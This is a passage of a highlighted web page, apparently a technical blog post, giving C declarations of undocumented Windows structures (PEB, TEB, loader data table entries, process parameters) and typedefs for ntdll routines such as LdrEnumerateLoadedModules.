class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br><span class="line"><span class="keyword">typedef</span> UNICODE_STRING* PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PCHAR Buffer;</span><br><span class="line">&#125; STRING;</span><br><span class="line"><span class="keyword">typedef</span> STRING* PSTRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span> &#123;</span></span><br><span class="line">    HANDLE UniqueProcess;</span><br><span class="line">    HANDLE UniqueThread;</span><br><span class="line">&#125; CLIENT_ID, * PCLIENT_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID64</span> &#123;</span></span><br><span class="line">    ULONG64 UniqueProcess;</span><br><span class="line">    ULONG64 UniqueThread;</span><br><span class="line">&#125; CLIENT_ID64, * PCLIENT_ID64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY_COMPATIBLE</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">        LIST_ENTRY InProgressLinks;</span><br><span class="line">    &#125; DUMMYUNION0;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG Flags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG PackagedBinary : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=0 BitCount=1</span></span><br><span class="line">            ULONG MarkedForRemoval : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=1 BitCount=1</span></span><br><span class="line">            ULONG ImageDll : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=2 BitCount=1</span></span><br><span class="line">            ULONG LoadNotificationsSent : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=3 BitCount=1</span></span><br><span class="line">            ULONG TelemetryEntryProcessed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=4 BitCount=1</span></span><br><span class="line">            ULONG ProcessStaticImport : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=5 BitCount=1</span></span><br><span class="line">            ULONG InLegacyLists : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=6 BitCount=1</span></span><br><span class="line">            ULONG InIndexes : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=7 BitCount=1</span></span><br><span class="line">            ULONG ShimDll : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=8 BitCount=1</span></span><br><span class="line">            ULONG InExceptionTable : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=9 BitCount=1</span></span><br><span class="line">            ULONG ReservedFlags1 : <span class="number">2</span>; <span class="comment">// Size=4 Offset=104 BitOffset=10 BitCount=2</span></span><br><span class="line">            ULONG LoadInProgress : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=12 BitCount=1</span></span><br><span class="line">            ULONG LoadConfigProcessed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=13 BitCount=1</span></span><br><span class="line">            ULONG EntryProcessed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=14 BitCount=1</span></span><br><span class="line">            ULONG ProtectDelayLoad : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=15 BitCount=1</span></span><br><span class="line">            ULONG ReservedFlags3 : <span class="number">2</span>; <span class="comment">// Size=4 Offset=104 BitOffset=16 BitCount=2</span></span><br><span class="line">            ULONG DontCallForThreads : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=18 BitCount=1</span></span><br><span class="line">            ULONG ProcessAttachCalled : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=19 BitCount=1</span></span><br><span class="line">            ULONG ProcessAttachFailed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=20 BitCount=1</span></span><br><span class="line">            ULONG CorDeferredValidate : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=21 BitCount=1</span></span><br><span class="line">            ULONG CorImage : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=22 BitCount=1</span></span><br><span class="line">            ULONG DontRelocate : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=23 BitCount=1</span></span><br><span class="line">            ULONG CorILOnly : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=24 BitCount=1</span></span><br><span class="line">            ULONG ChpeImage : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=25 BitCount=1</span></span><br><span class="line">            ULONG ReservedFlags5 : <span class="number">2</span>; <span class="comment">// Size=4 Offset=104 BitOffset=26 BitCount=2</span></span><br><span class="line">            ULONG Redirected : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=28 BitCount=1</span></span><br><span class="line">            ULONG ReservedFlags6 : <span class="number">2</span>; <span class="comment">// Size=4 Offset=104 BitOffset=29 BitCount=2</span></span><br><span class="line">            ULONG CompatDatabaseProcessed : <span class="number">1</span>; <span class="comment">// Size=4 Offset=104 BitOffset=31 BitCount=1</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; ENTRYFLAGSUNION;</span><br><span class="line">    WORD ObsoleteLoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; DUMMYUNION1;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG TimeDateStamp;</span><br><span class="line">        PVOID LoadedImports;</span><br><span class="line">    &#125; DUMMYUNION2;</span><br><span class="line">    <span class="comment">//fields below removed for compatibility</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY_COMPATIBLE, * PLDR_DATA_TABLE_ENTRY_COMPATIBLE;</span><br><span class="line"><span class="keyword">typedef</span> LDR_DATA_TABLE_ENTRY_COMPATIBLE LDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LDR_DATA_TABLE_ENTRY* PCLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span> &#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    HANDLE SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress;</span><br><span class="line">    BOOLEAN ShutdownInProgress;</span><br><span class="line">    HANDLE ShutdownThreadId;</span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CURDIR</span> &#123;</span></span><br><span class="line">    UNICODE_STRING DosPath;</span><br><span class="line">    HANDLE Handle;</span><br><span class="line">&#125; CURDIR, * PCURDIR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_DRIVE_LETTER_CURDIR</span> &#123;</span></span><br><span class="line">    USHORT Flags;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_USER_PROCESS_PARAMETERS</span> &#123;</span></span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line"></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line"></span><br><span class="line">    HANDLE ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    HANDLE StandardInput;</span><br><span class="line">    HANDLE StandardOutput;</span><br><span class="line">    HANDLE StandardError;</span><br><span class="line"></span><br><span class="line">    CURDIR CurrentDirectory;</span><br><span class="line">    UNICODE_STRING DllPath;</span><br><span class="line">    UNICODE_STRING ImagePathName;</span><br><span class="line">    UNICODE_STRING CommandLine;</span><br><span class="line">    PVOID Environment;</span><br><span class="line"></span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line"></span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING WindowTitle;</span><br><span class="line">    UNICODE_STRING DesktopInfo;</span><br><span class="line">    UNICODE_STRING ShellInfo;</span><br><span class="line">    UNICODE_STRING RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];</span><br><span class="line"></span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">    ULONG EnvironmentVersion;</span><br><span class="line">    PVOID PackageDependencyData; <span class="comment">//8+</span></span><br><span class="line">    ULONG ProcessGroupId;</span><br><span class="line">    <span class="comment">// ULONG LoaderThreads;</span></span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">    BOOLEAN InheritedAddressSpace;</span><br><span class="line">    BOOLEAN ReadImageFileExecOptions;</span><br><span class="line">    BOOLEAN BeingDebugged;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        BOOLEAN BitField;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            BOOLEAN ImageUsesLargePages : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsImageDynamicallyRelocated : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN SkipPatchingUser32Forwarders : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsPackagedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsAppContainer : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcessLight : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsLongPathAwareProcess : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    HANDLE Mutant;</span><br><span class="line"></span><br><span class="line">    PVOID ImageBaseAddress;</span><br><span class="line">    PPEB_LDR_DATA Ldr;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    PVOID SubSystemData;</span><br><span class="line">    PVOID ProcessHeap;</span><br><span class="line">    PRTL_CRITICAL_SECTION FastPebLock;</span><br><span class="line">    PVOID AtlThunkSListPtr;</span><br><span class="line">    PVOID IFEOKey;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG CrossProcessFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG ProcessInJob : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessInitializing : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVEH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVCH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingFTH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessPreviouslyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessCurrentlyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedBits0 : <span class="number">25</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        ULONG EnvironmentUpdateCount;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        PVOID KernelCallbackTable;</span><br><span class="line">        PVOID UserSharedInfoPtr;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG SystemReserved[<span class="number">1</span>];</span><br><span class="line">    ULONG AtlThunkSListPtr32;</span><br><span class="line">    PVOID ApiSetMap;</span><br><span class="line">    ULONG TlsExpansionCounter;</span><br><span class="line">    PVOID TlsBitmap;</span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    PVOID ReadOnlySharedMemoryBase;</span><br><span class="line">    PVOID HotpatchInformation;</span><br><span class="line">    PVOID* ReadOnlyStaticServerData;</span><br><span class="line">    PVOID AnsiCodePageData;</span><br><span class="line">    PVOID OemCodePageData;</span><br><span class="line">    PVOID UnicodeCaseTableData;</span><br><span class="line"></span><br><span class="line">    ULONG NumberOfProcessors;</span><br><span class="line">    ULONG NtGlobalFlag;</span><br><span class="line"></span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    SIZE_T HeapSegmentReserve;</span><br><span class="line">    SIZE_T HeapSegmentCommit;</span><br><span class="line">    SIZE_T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    SIZE_T HeapDeCommitFreeBlockThreshold;</span><br><span class="line"></span><br><span class="line">    ULONG NumberOfHeaps;</span><br><span class="line">    ULONG MaximumNumberOfHeaps;</span><br><span class="line">    PVOID* ProcessHeaps;</span><br><span class="line"></span><br><span class="line">    PVOID GdiSharedHandleTable;</span><br><span class="line">    PVOID ProcessStarterHelper;</span><br><span class="line">    ULONG GdiDCAttributeList;</span><br><span class="line"></span><br><span class="line">    PRTL_CRITICAL_SECTION LoaderLock;</span><br><span class="line"></span><br><span class="line">    ULONG OSMajorVersion;</span><br><span class="line">    ULONG OSMinorVersion;</span><br><span class="line">    USHORT OSBuildNumber;</span><br><span class="line">    USHORT OSCSDVersion;</span><br><span class="line">    ULONG OSPlatformId;</span><br><span class="line">    ULONG ImageSubsystem;</span><br><span class="line">    ULONG ImageSubsystemMajorVersion;</span><br><span class="line">    ULONG ImageSubsystemMinorVersion;</span><br><span class="line">    ULONG_PTR ImageProcessAffinityMask;</span><br><span class="line">    GDI_HANDLE_BUFFER GdiHandleBuffer;</span><br><span class="line">    PVOID PostProcessInitRoutine;</span><br><span class="line"></span><br><span class="line">    PVOID TlsExpansionBitmap;</span><br><span class="line">    ULONG TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    ULONG SessionId;</span><br><span class="line"></span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    PVOID pShimData;</span><br><span class="line">    PVOID AppCompatInfo;</span><br><span class="line"></span><br><span class="line">    UNICODE_STRING CSDVersion;</span><br><span class="line"></span><br><span class="line">    PVOID ActivationContextData;</span><br><span class="line">    PVOID ProcessAssemblyStorageMap;</span><br><span class="line">    PVOID SystemDefaultActivationContextData;</span><br><span class="line">    PVOID SystemAssemblyStorageMap;</span><br><span class="line"></span><br><span class="line">    SIZE_T MinimumStackCommit;</span><br><span class="line"></span><br><span class="line">    PVOID* FlsCallback;</span><br><span class="line">    LIST_ENTRY FlsListHead;</span><br><span class="line">    PVOID FlsBitmap;</span><br><span class="line">    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (<span class="keyword">sizeof</span>(ULONG) * <span class="number">8</span>)];</span><br><span class="line">    ULONG FlsHighIndex;</span><br><span class="line"></span><br><span class="line">    PVOID WerRegistrationData;</span><br><span class="line">    PVOID WerShipAssertPtr;</span><br><span class="line">    PVOID pContextData;</span><br><span class="line">    PVOID pImageHeaderHash;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG TracingFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG HeapTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG CritSecTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG LibLoaderTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG SpareTracingBits : <span class="number">29</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONGLONG CsrServerReadOnlySharedMemoryBase;</span><br><span class="line">&#125; PEB, * PPEB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GDI_TEB_BATCH</span> &#123;</span></span><br><span class="line">    ULONGOffset;</span><br><span class="line">    UCHARAlignment[<span class="number">4</span>];</span><br><span class="line">    ULONG_PTR HDC;</span><br><span class="line">    ULONGBuffer[GDI_BATCH_BUFFER_SIZE];</span><br><span class="line">&#125; GDI_TEB_BATCH, * PGDI_TEB_BATCH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME_CONTEXT</span> &#123;</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PSTR FrameName;</span><br><span class="line">&#125; TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME</span> &#123;</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME</span>* <span class="title">Previous</span>;</span></span><br><span class="line">    PTEB_ACTIVE_FRAME_CONTEXT Context;</span><br><span class="line">&#125; TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TEB</span> &#123;</span></span><br><span class="line">    NT_TIB NtTib;</span><br><span class="line"></span><br><span class="line">    PVOID EnvironmentPointer;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    PVOID ActiveRpcHandle;</span><br><span class="line">    PVOID ThreadLocalStoragePointer;</span><br><span class="line">    PPEB ProcessEnvironmentBlock;</span><br><span class="line"></span><br><span class="line">    ULONG LastErrorValue;</span><br><span class="line">    ULONG CountOfOwnedCriticalSections;</span><br><span class="line">    PVOID CsrClientThread;</span><br><span class="line">    PVOID Win32ThreadInfo;</span><br><span class="line">    ULONG User32Reserved[<span class="number">26</span>];</span><br><span class="line">    ULONG UserReserved[<span class="number">5</span>];</span><br><span class="line">    PVOID WOW32Reserved;</span><br><span class="line">    LCID CurrentLocale;</span><br><span class="line">    ULONG FpSoftwareStatusRegister;</span><br><span class="line">    PVOID SystemReserved1[<span class="number">54</span>];</span><br><span class="line">    NTSTATUS ExceptionCode;</span><br><span class="line">    PVOID ActivationContextStackPointer;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">24</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">36</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ULONG TxFsContext;</span><br><span class="line"></span><br><span class="line">    GDI_TEB_BATCH GdiTebBatch;</span><br><span class="line">    CLIENT_ID RealClientId;</span><br><span class="line">    HANDLE GdiCachedProcessHandle;</span><br><span class="line">    ULONG GdiClientPID;</span><br><span class="line">    ULONG GdiClientTID;</span><br><span class="line">    PVOID GdiThreadLocalInfo;</span><br><span class="line">    ULONG_PTR Win32ClientInfo[<span class="number">62</span>];</span><br><span class="line">    PVOID glDispatchTable[<span class="number">233</span>];</span><br><span class="line">    ULONG_PTR glReserved1[<span class="number">29</span>];</span><br><span class="line">    PVOID glReserved2;</span><br><span class="line">    PVOID glSectionInfo;</span><br><span class="line">    PVOID glSection;</span><br><span class="line">    PVOID glTable;</span><br><span class="line">    PVOID glCurrentRC;</span><br><span class="line">    PVOID glContext;</span><br><span class="line"></span><br><span class="line">    NTSTATUS LastStatusValue;</span><br><span class="line">    UNICODE_STRING StaticUnicodeString;</span><br><span class="line">    WCHAR StaticUnicodeBuffer[<span class="number">261</span>];</span><br><span class="line"></span><br><span class="line">    PVOID DeallocationStack;</span><br><span class="line">    PVOID TlsSlots[<span class="number">64</span>];</span><br><span class="line">    LIST_ENTRY TlsLinks;</span><br><span class="line"></span><br><span class="line">    PVOID Vdm;</span><br><span class="line">    PVOID ReservedForNtRpc;</span><br><span class="line">    PVOID DbgSsReserved[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    ULONG HardErrorMode;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    PVOID Instrumentation[<span class="number">11</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID Instrumentation[<span class="number">9</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    GUID ActivityId;</span><br><span class="line"></span><br><span class="line">    PVOID SubProcessTag;</span><br><span class="line">    PVOID EtwLocalData;</span><br><span class="line">    PVOID EtwTraceData;</span><br><span class="line">    PVOID WinSockData;</span><br><span class="line">    ULONG GdiBatchCount;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        PROCESSOR_NUMBER CurrentIdealProcessor;</span><br><span class="line">        ULONG IdealProcessorValue;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR ReservedPad0;</span><br><span class="line">            UCHAR ReservedPad1;</span><br><span class="line">            UCHAR ReservedPad2;</span><br><span class="line">            UCHAR IdealProcessor;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ULONG GuaranteedStackBytes;</span><br><span class="line">    PVOID ReservedForPerf;</span><br><span class="line">    PVOID ReservedForOle;</span><br><span class="line">    ULONG WaitingOnLoaderLock;</span><br><span class="line">    PVOID SavedPriorityState;</span><br><span class="line">    ULONG_PTR SoftPatchPtr1;</span><br><span class="line">    PVOID ThreadPoolData;</span><br><span class="line">    PVOID* TlsExpansionSlots;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    PVOID DeallocationBStore;</span><br><span class="line">    PVOID BStoreLimit;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ULONG MuiGeneration;</span><br><span class="line">    ULONG IsImpersonating;</span><br><span class="line">    PVOID NlsCache;</span><br><span class="line">    PVOID pShimData;</span><br><span class="line">    ULONG HeapVirtualAffinity;</span><br><span class="line">    HANDLE CurrentTransactionHandle;</span><br><span class="line">    PTEB_ACTIVE_FRAME ActiveFrame;</span><br><span class="line">    PVOID FlsData;</span><br><span class="line"></span><br><span class="line">    PVOID PreferredLanguages;</span><br><span class="line">    PVOID UserPrefLanguages;</span><br><span class="line">    PVOID MergedPrefLanguages;</span><br><span class="line">    ULONG MuiImpersonation;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        USHORT CrossTebFlags;</span><br><span class="line">        USHORT SpareCrossTebBits : <span class="number">16</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        USHORT SameTebFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            USHORT SafeThunkCall : <span class="number">1</span>;</span><br><span class="line">            USHORT InDebugPrint : <span class="number">1</span>;</span><br><span class="line">            USHORT HasFiberData : <span class="number">1</span>;</span><br><span class="line">            USHORT SkipThreadAttach : <span class="number">1</span>;</span><br><span class="line">            USHORT WerInShipAssertCode : <span class="number">1</span>;</span><br><span class="line">            USHORT RanProcessInit : <span class="number">1</span>;</span><br><span class="line">            USHORT ClonedThread : <span class="number">1</span>;</span><br><span class="line">            USHORT SuppressDebugMsg : <span class="number">1</span>;</span><br><span class="line">            USHORT DisableUserStackWalk : <span class="number">1</span>;</span><br><span class="line">            USHORT RtlExceptionAttached : <span class="number">1</span>;</span><br><span class="line">            USHORT InitialThread : <span class="number">1</span>;</span><br><span class="line">            USHORT SpareSameTebBits : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    PVOID TxnScopeEnterCallback;</span><br><span class="line">    PVOID TxnScopeExitCallback;</span><br><span class="line">    PVOID TxnScopeContext;</span><br><span class="line">    ULONG LockCount;</span><br><span class="line">    ULONG SpareUlong0;</span><br><span class="line">    PVOID ResourceRetValue;</span><br><span class="line">&#125; TEB, * PTEB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span><span class="params">(NTAPI* PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_    PCLDR_DATA_TABLE_ENTRY DataTableEntry,</span></span><br><span class="line"><span class="params">    _In_    PVOID Context,</span></span><br><span class="line"><span class="params">    _Inout_ BOOLEAN* StopEnumeration</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> PVOID NTAPI <span class="title function_">RTLINITUNICODESTRING</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Inout_PUNICODE_STRING DestinationString,</span></span><br><span class="line"><span class="params">    _In_opt_ PCWSTR SourceString</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="keyword">typedef</span> RTLINITUNICODESTRING FAR* LPRTLINITUNICODESTRING;</span><br><span class="line">LPRTLINITUNICODESTRINGRtlInitUnicodeString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> NTSTATUS NTAPI <span class="title function_">RTLENTERCRITICALSECTION</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PRTL_CRITICAL_SECTION CriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="keyword">typedef</span> RTLENTERCRITICALSECTION FAR* LPRTLENTERCRITICALSECTION;</span><br><span class="line">LPRTLENTERCRITICALSECTIONRtlEnterCriticalSection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> NTSTATUS NTAPI <span class="title function_">RTLLEAVECRITICALSECTION</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PRTL_CRITICAL_SECTION CriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="keyword">typedef</span> RTLLEAVECRITICALSECTION FAR* LPRTLLEAVECRITICALSECTION;</span><br><span class="line">LPRTLLEAVECRITICALSECTIONRtlLeaveCriticalSection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> NTSTATUS NTAPI <span class="title function_">LDRENUMERATELOADEDMODULES</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_opt_ ULONG Flags,</span></span><br><span class="line"><span class="params">    _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID Context)</span>;</span><br><span class="line"><span class="keyword">typedef</span> LDRENUMERATELOADEDMODULES FAR* LPLDRENUMERATELOADEDMODULES;</span><br><span 